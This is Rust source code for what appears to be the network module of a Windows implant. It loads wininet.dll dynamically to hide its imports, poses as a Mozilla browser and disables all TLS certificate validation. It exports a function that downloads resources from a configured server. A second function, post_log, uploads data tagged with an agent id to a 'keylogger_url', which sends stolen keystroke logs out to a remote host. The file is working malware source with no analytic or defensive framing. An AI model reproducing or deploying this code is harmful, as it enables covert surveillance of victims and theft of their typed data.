use std::{default, ffi::c_void, iter, ptr};

use windows_sys::{Win32::{Foundation::{GetLastError, HMODULE}, System::LibraryLoader::{GetProcAddress, LoadLibraryW}}, s};

use crate::{PCWSTR_to_string, agent_id, keylogger_url, resource_url};


const INTERNET_OPEN_TYPE_PRECONFIG: u32 = 0;
const INTERNET_FLAG_RELOAD: u32 = 0x80000000;
const INTERNET_FLAG_NO_CACHE_WRITE: u32 = 0x04000000;
const INTERNET_FLAG_SECURE: u32 = 0x00800000;
const INTERNET_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x00001000;
const INTERNET_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x00002000;
const INTERNET_FLAG_KEEP_CONNECTION: u32 = 0x00400000;
const INTERNET_SERVICE_HTTP: u32 = 3;
const INTERNET_DEFAULT_HTTPS_PORT: u16 = 443;
const INTERNET_DEFAULT_HTTP_PORT: u16 = 80;
const HTTP_QUERY_CONTENT_LENGTH: u32 = 5;
const HTTP_QUERY_FLAG_NUMBER: u32 = 0x20000000;
const INTERNET_OPTION_SECURITY_FLAGS: u32 = 31;
const SECURITY_FLAG_IGNORE_UNKNOWN_CA: u32 = 0x00000100;
const SECURITY_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x00001000;
const SECURITY_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x00002000;
const SECURITY_FLAG_IGNORE_WRONG_USAGE: u32 = 0x00000200;
const SECURITY_FLAG_IGNORE_REVOCATION: u32 = 0x00000080;
const HTTP_QUERY_STATUS_CODE: u32 = 19;

type InternetOpenW = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> *mut c_void;
type InternetConnectW = unsafe extern "system" fn(*mut c_void, *const u16, u16, *const u16, *const u16, u32, u32, usize) -> *mut c_void;
type HttpOpenRequestW = unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, *const u16, *const *const u16, u32, usize) -> *mut c_void;
type HttpSendRequestW = unsafe extern "system" fn(*mut c_void, *const u16, u32, *const c_void, u32) -> i32;
type InternetSetOptionW = unsafe extern "system" fn(*mut c_void, u32, *const c_void, u32) -> i32;
type HttpQueryInfoW = unsafe extern "system" fn(*mut c_void, u32, *mut c_void, *mut u32, *mut u32) -> i32;
type InternetReadFile = unsafe extern "system" fn(*mut c_void, *mut c_void, u32, *mut u32) -> i32;
type InternetCloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

fn load_wininet() -> Option<HMODULE> {
    let wininet_name: [u16; 12] = [b'w' as u16, b'i' as u16, b'n' as u16, b'i' as u16, b'n' as u16, b'e' as u16, b't' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16, 0];
    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] Loading wininet.dll...");
    }
    unsafe {
    let h_wininet = LoadLibraryW(wininet_name.as_ptr());
    if h_wininet.is_null() {
        #[cfg(debug_assertions)]
        {
            println!("[download_rsrc] Failed to load wininet.dll, error: {}", GetLastError());
        }
        return None;
    }

    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] wininet.dll loaded successfully");
    }

    Some(h_wininet as HMODULE)
    }
}
#[derive(Default,PartialEq,Debug)]
enum url_scheme {
    #[default] http,
    https
}

#[derive(Default,Debug)]
struct url_components {
    scheme:url_scheme,
    port:u16,
    host:String,
    path:String,
}

fn parse_url(url:&str) -> Result<url_components,return_values> {

    let mut url_components:url_components = Default::default();


    if url.starts_with("https://") {
        url_components.scheme = url_scheme::https
    } else if url.starts_with("http://") {
        url_components.scheme = url_scheme::http
    } else {
        #[cfg(debug_assertions)]
        {
            println!("[download_rsrc] Invalid URL scheme, must be http:// or https://");
        }
        return Err(return_values::invalid_url);
    }

    let url_without_scheme = match url_components.scheme {
        url_scheme::http => {
            &url[7..]
        },
        url_scheme::https => {
            &url[8..]
        },
    };

    let (host_port, path) = match url_without_scheme.find('/') {
        Some(idx) => (&url_without_scheme[..idx], &url_without_scheme[idx..]),
        None => (url_without_scheme, "/"),
    };

    let (host, port): (&str, u16) = match host_port.find(':') {
        Some(idx) => {
            let port_str = &host_port[idx + 1..];
            let port = port_str.parse::<u16>().unwrap_or(if url_components.scheme == url_scheme::https { INTERNET_DEFAULT_HTTPS_PORT } else { INTERNET_DEFAULT_HTTP_PORT });
            (&host_port[..idx], port)
        }
        None => (host_port, if url_components.scheme == url_scheme::https { INTERNET_DEFAULT_HTTPS_PORT } else { INTERNET_DEFAULT_HTTP_PORT }),
    };

    url_components.host = host.to_string();
    url_components.path = path.to_string();
    url_components.port = port;


    Ok(url_components)
}

#[derive(Debug)]
#[repr(u32)]
pub enum return_values {
    success = 0,
    failed_to_load_module = 1,
    failed_to_get_proc_address = 2,
    http_request_failed = 3,
    buffer_too_small = 6,
    invalid_url = 9,
    resource_not_found = 10,
}

#[derive(Debug,PartialEq)]
#[repr(u32)]
pub enum text_encoding {
    utf8 = 8,
    utf16 = 16
}

/// Downloads a resource from the given URL using WinINet APIs loaded dynamically.
/// # Arguments
/// * `url` - Null-terminated wide string (UTF-16) URL to download from
/// * `buffer` - Pointer to caller-allocated buffer to receive data
/// * `buffer_size` - Size of the provided buffer in bytes
/// * `bytes_written` - Pointer to receive the actual bytes written (or required size on error)
#[unsafe(no_mangle)]
pub unsafe extern "system" fn download_rsrc(
    resouce: *const u16,
    buffer: *mut u8,
    buffer_size: usize,
    bytes_written: *mut usize,
) -> return_values {

    let h_wininet = match load_wininet() {
        Some(v) => {v},
        None => {
            return return_values::failed_to_load_module;
        }
    };

    let p_internet_open: InternetOpenW = match GetProcAddress(h_wininet, s!("InternetOpenW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let p_internet_connect: InternetConnectW = match GetProcAddress(h_wininet, s!("InternetConnectW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let p_http_open_request: HttpOpenRequestW = match GetProcAddress(h_wininet, s!("HttpOpenRequestW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let p_http_send_request: HttpSendRequestW = match GetProcAddress(h_wininet, s!("HttpSendRequestW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let p_internet_set_option: InternetSetOptionW = match GetProcAddress(h_wininet, s!("InternetSetOptionW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let p_http_query_info: HttpQueryInfoW = match GetProcAddress(h_wininet, s!("HttpQueryInfoW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let p_internet_read_file: InternetReadFile = match GetProcAddress(h_wininet, s!("InternetReadFile")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let p_internet_close_handle: InternetCloseHandle = match GetProcAddress(h_wininet, s!("InternetCloseHandle")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let user_agent: [u16; 8] = [b'M' as u16, b'o' as u16, b'z' as u16, b'i' as u16, b'l' as u16, b'l' as u16, b'a' as u16, 0];

    let full_url = format!("{}{}", resource_url, PCWSTR_to_string(resouce));
    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] Full URL: {}", full_url);
        println!("[download_rsrc] Buffer size: {} bytes", buffer_size);
    }

    let parsed_url = match parse_url(&full_url) {
        Ok(v) => {v},
        Err(e) => {
            return e;
        }
    };

    #[cfg(debug_assertions)]
    {
        println!("{:?}",parsed_url);
    }

    let host_wide: Vec<u16> = parsed_url.host.encode_utf16().chain(iter::once(0)).collect();
    let path_wide: Vec<u16> = parsed_url.path.encode_utf16().chain(iter::once(0)).collect();
    let method_get: [u16; 4] = [b'G' as u16, b'E' as u16, b'T' as u16, 0];

    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] Calling InternetOpenW...");
    }

    let h_internet = p_internet_open(
        user_agent.as_ptr(),
        INTERNET_OPEN_TYPE_PRECONFIG,
        ptr::null(),
        ptr::null(),
        0,
    );
    if h_internet.is_null() {
        #[cfg(debug_assertions)]
        {
            println!("[download_rsrc] InternetOpenW failed, error: {}", GetLastError());
        }
        return return_values::http_request_failed;
    }

    let h_connect = p_internet_connect(
        h_internet,
        host_wide.as_ptr(),
        parsed_url.port,
        ptr::null(),
        ptr::null(),
        INTERNET_SERVICE_HTTP,
        0,
        0,
    );

    if h_connect.is_null() {
        #[cfg(debug_assertions)]
        {
            println!("[download_rsrc] InternetConnectW failed, error: {}", GetLastError());
        }
        p_internet_close_handle(h_internet);
        return return_values::http_request_failed;
    }

    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] InternetConnectW succeeded, handle: {:?}", h_connect);
    }

    let mut request_flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;
    if parsed_url.scheme == url_scheme::https {
        request_flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }

    let h_request = p_http_open_request(
        h_connect,
        method_get.as_ptr(),
        path_wide.as_ptr(),
        ptr::null(), // Use default HTTP version
        ptr::null(), // No referrer
        ptr::null(), // Accept all types
        request_flags,
        0,
    );
    if h_request.is_null() {
        #[cfg(debug_assertions)]
        {
            println!("[download_rsrc] HttpOpenRequestW failed, error: {}", GetLastError());
        }
        p_internet_close_handle(h_connect);
        p_internet_close_handle(h_internet);
        return return_values::http_request_failed;
    }
    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] HttpOpenRequestW succeeded, handle: {:?}", h_request);
    }

    if parsed_url.scheme == url_scheme::https {
        #[cfg(debug_assertions)]
        {
            println!("[download_rsrc] Setting security flags to ignore ALL cert errors including revocation...");
        }
        let security_flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
            | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
            | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
            | SECURITY_FLAG_IGNORE_WRONG_USAGE
            | SECURITY_FLAG_IGNORE_REVOCATION;
        let set_option_result = p_internet_set_option(
            h_request,
            INTERNET_OPTION_SECURITY_FLAGS,
            &security_flags as *const u32 as *const c_void,
            std::mem::size_of::<u32>() as u32,
        );
        #[cfg(debug_assertions)]
        {
            if set_option_result == 0 {
                println!("[download_rsrc] InternetSetOptionW failed, error: {}", GetLastError());
            } else {
                println!("[download_rsrc] Security flags set successfully (flags: 0x{:08X})", security_flags);
            }
        }
    }

    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] Calling HttpSendRequestW...");
    }
    let send_result = p_http_send_request(
        h_request,
        ptr::null(),
        0,
        ptr::null(),
        0,
    );
    if send_result == 0 {
        let last_error = GetLastError();
        #[cfg(debug_assertions)]
        {
            println!("[download_rsrc] HttpSendRequestW FAILED!");
            println!("[download_rsrc] GetLastError: {} (0x{:08X})", last_error, last_error);
            match last_error {
                12029 => println!("[download_rsrc] ERROR_INTERNET_CANNOT_CONNECT - Cannot connect to server"),
                12030 => println!("[download_rsrc] ERROR_INTERNET_CONNECTION_ABORTED - Connection aborted"),
                12031 => println!("[download_rsrc] ERROR_INTERNET_CONNECTION_RESET - Connection reset"),
                12037 => println!("[download_rsrc] ERROR_INTERNET_SEC_CERT_DATE_INVALID - Certificate date invalid"),
                12038 => println!("[download_rsrc] ERROR_INTERNET_SEC_CERT_CN_INVALID - Certificate CN invalid"),
                12044 => println!("[download_rsrc] ERROR_INTERNET_SEC_CERT_ERRORS - Certificate errors"),
                12045 => println!("[download_rsrc] ERROR_INTERNET_SEC_CERT_REV_FAILED - Certificate revocation check failed"),
                12057 => println!("[download_rsrc] ERROR_INTERNET_SEC_CERT_NO_REV - No certificate revocation info"),
                12169 => println!("[download_rsrc] ERROR_INTERNET_SEC_INVALID_CERT - Invalid certificate"),
                12170 => println!("[download_rsrc] ERROR_INTERNET_SEC_CERT_REVOKED - Certificate revoked"),
                12175 => println!("[download_rsrc] ERROR_INTERNET_DECODING_FAILED - Decoding failed"),
                12007 => println!("[download_rsrc] ERROR_INTERNET_NAME_NOT_RESOLVED - Server name not resolved"),
                12002 => println!("[download_rsrc] ERROR_INTERNET_TIMEOUT - Request timed out"),
                _ => println!("[download_rsrc] Unknown error code"),
            }
        }
        p_internet_close_handle(h_request);
        p_internet_close_handle(h_connect);
        p_internet_close_handle(h_internet);
        return return_values::http_request_failed;
    }

    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] HttpSendRequestW succeeded!");
    }

    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] Querying content length...");
    }

    let mut content_length: u32 = 0;
    let mut buffer_len: u32 = std::mem::size_of::<u32>() as u32;
    let query_result = p_http_query_info(
        h_request,
        HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
        &mut content_length as *mut u32 as *mut c_void,
        &mut buffer_len,
        ptr::null_mut(),
    );

    if query_result == 0 {
        content_length = 0;
    }

    if content_length == 0 {
        return return_values::resource_not_found
    }

    if content_length > 0 && (buffer_size as u32) < content_length {
        #[cfg(debug_assertions)]
        {
            println!("[download_rsrc] Buffer too small! Need {} bytes, have {} bytes", content_length, buffer_size);
        }
        *bytes_written = content_length as usize;
        p_internet_close_handle(h_request);
        p_internet_close_handle(h_connect);
        p_internet_close_handle(h_internet);
        return return_values::buffer_too_small;
    }

    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] Starting to read data...");
    }

    let mut total_read: usize = 0;
    let mut bytes_read: u32 = 0;
    let mut read_count: u32 = 0;
    
    loop {
        if total_read >= buffer_size {
            #[cfg(debug_assertions)]
            {
                println!("[download_rsrc] Buffer full, stopping read");
            }
            break;
        }
        
        let remaining = buffer_size - total_read;
        let to_read = if remaining > 8192 { 8192 } else { remaining as u32 };
        
        let read_result = p_internet_read_file(
            h_request,
            buffer.add(total_read) as *mut c_void,
            to_read,
            &mut bytes_read,
        );
        
        read_count += 1;
        
        if read_result == 0 {
            #[cfg(debug_assertions)]
            {
                println!("[download_rsrc] InternetReadFile failed on read #{}, error: {}", read_count, GetLastError());
            }

            p_internet_close_handle(h_request);
            p_internet_close_handle(h_connect);
            p_internet_close_handle(h_internet);
            return return_values::http_request_failed;
        }
        
        if bytes_read == 0 {
            #[cfg(debug_assertions)]
            {
                println!("[download_rsrc] Read complete (0 bytes returned on read #{})", read_count);
            }
            break;
        }
        
        total_read += bytes_read as usize;
        #[cfg(debug_assertions)]
        {
            if read_count <= 3 || read_count % 100 == 0 {
                println!("[download_rsrc] Read #{}: {} bytes (total: {} bytes)", read_count, bytes_read, total_read);
            }
        }
    }

    *bytes_written = total_read;
    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] Download complete! Total bytes read: {} in {} reads", total_read, read_count);
    }

    p_internet_close_handle(h_request);
    p_internet_close_handle(h_connect);
    p_internet_close_handle(h_internet);
    return_values::success
}



#[unsafe(no_mangle)]
pub unsafe extern "system" fn post_log(data: *const u8, data_len: usize, agentid:u32,encoding:text_encoding) -> return_values {
    let h_wininet = match load_wininet() {
        Some(v) => {v},
        None => {
            return return_values::failed_to_load_module;
        }
    };


    let p_internet_open: InternetOpenW = match GetProcAddress(h_wininet, s!("InternetOpenW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let p_internet_connect: InternetConnectW = match GetProcAddress(h_wininet, s!("InternetConnectW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let p_http_open_request: HttpOpenRequestW = match GetProcAddress(h_wininet, s!("HttpOpenRequestW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let p_http_send_request: HttpSendRequestW = match GetProcAddress(h_wininet, s!("HttpSendRequestW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };
    let p_internet_set_option: InternetSetOptionW = match GetProcAddress(h_wininet, s!("InternetSetOptionW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };
    let p_http_query_info: HttpQueryInfoW = match GetProcAddress(h_wininet, s!("HttpQueryInfoW")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };
    let p_internet_close_handle: InternetCloseHandle = match GetProcAddress(h_wininet, s!("InternetCloseHandle")) {
        Some(p) => std::mem::transmute(p),
        None => {
            return return_values::failed_to_get_proc_address;
        }
    };

    let full_url = format!("{}{}?enc={}", keylogger_url, agentid, if encoding == text_encoding::utf8 {8} else {16});
    #[cfg(debug_assertions)]
    {
        println!("[download_rsrc] Full URL: {}", full_url);
    }

    let parsed_url = match parse_url(&full_url) {
        Ok(v) => {v},
        Err(e) => {
            return e;
        }
    };

    #[cfg(debug_assertions)]
    {
        println!("{:?}",parsed_url);
    }

    let host_wide: Vec<u16> = parsed_url.host.encode_utf16().chain(iter::once(0)).collect();
    let path_wide: Vec<u16> = parsed_url.path.encode_utf16().chain(iter::once(0)).collect();
    let method_post: [u16; 5] = [b'P' as u16, b'O' as u16, b'S' as u16,b'T' as u16, 0];
    let user_agent: Vec<u16> = "Mozilla/5.0\0".encode_utf16().collect();
    let content_type: Vec<u16> = "Content-Type: application/octet-stream\0".encode_utf16().collect();

    let h_internet = p_internet_open(
        user_agent.as_ptr(),
        INTERNET_OPEN_TYPE_PRECONFIG,
        ptr::null(),
        ptr::null(),
        0,
    );
    if h_internet.is_null() {
        #[cfg(debug_assertions)]
        {
            println!("[HTTP DEBUG] InternetOpenW failed");
        }
        return return_values::http_request_failed
    }

    let h_connect = p_internet_connect(
        h_internet,
        host_wide.as_ptr(),
        parsed_url.port,
        ptr::null(),
        ptr::null(),
        INTERNET_SERVICE_HTTP,
        0,
        0,
    );

    if h_connect.is_null() {
        #[cfg(debug_assertions)]
        {
            println!("[HTTP DEBUG] InternetConnectW failed");
        }
        p_internet_close_handle(h_internet);
        return return_values::http_request_failed
    }

    let mut request_flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;
    if parsed_url.scheme == url_scheme::https {
        request_flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }

    let h_request = p_http_open_request(
        h_connect,
        method_post.as_ptr(),
        path_wide.as_ptr(),
        ptr::null(),
        ptr::null(),
        ptr::null(),
        request_flags,
        0,
    );
    if h_request.is_null() {
        #[cfg(debug_assertions)]
        {
            println!("[HTTP DEBUG] HttpOpenRequestW failed");
        }
        p_internet_close_handle(h_connect);
        p_internet_close_handle(h_internet);
        return return_values::http_request_failed
    }

    if parsed_url.scheme == url_scheme::https {
        let security_flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
            | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
            | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
            | SECURITY_FLAG_IGNORE_WRONG_USAGE
            | SECURITY_FLAG_IGNORE_REVOCATION;
        let _set_result = p_internet_set_option(
            h_request,
            INTERNET_OPTION_SECURITY_FLAGS,
            &security_flags as *const u32 as *const c_void,
            std::mem::size_of::<u32>() as u32,
        );
        #[cfg(debug_assertions)]
        {
            if _set_result == 0 {
                println!("[HTTP DEBUG] InternetSetOptionW failed");
            } else {
                println!("[HTTP DEBUG] Security flags set successfully");
            }
        }
    }

    let send_result = p_http_send_request(
        h_request,
        content_type.as_ptr(),
        (content_type.len() - 1) as u32,
        data as *const c_void,
        data_len as u32,
    );
    if send_result == 0 {
        #[cfg(debug_assertions)]
        {
            println!("[HTTP DEBUG] HttpSendRequestW failed");
        }
        p_internet_close_handle(h_request);
        p_internet_close_handle(h_connect);
        p_internet_close_handle(h_internet);
        return return_values::http_request_failed
    }

    let mut status_code: u32 = 0;
    let mut size: u32 = std::mem::size_of::<u32>() as u32;
    let query_result = p_http_query_info(
        h_request,
        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        &mut status_code as *mut u32 as *mut c_void,
        &mut size,
        ptr::null_mut(),
    );

    p_internet_close_handle(h_request);
    p_internet_close_handle(h_connect);
    p_internet_close_handle(h_internet);

    if query_result == 0 {
        #[cfg(debug_assertions)]
        {
            println!("[HTTP DEBUG] HttpQueryInfoW failed");
        }
        return return_values::http_request_failed
    }

    #[cfg(debug_assertions)]
    {
        println!("[HTTP DEBUG] HTTP response status: {}", status_code);
    }

    return_values::success
}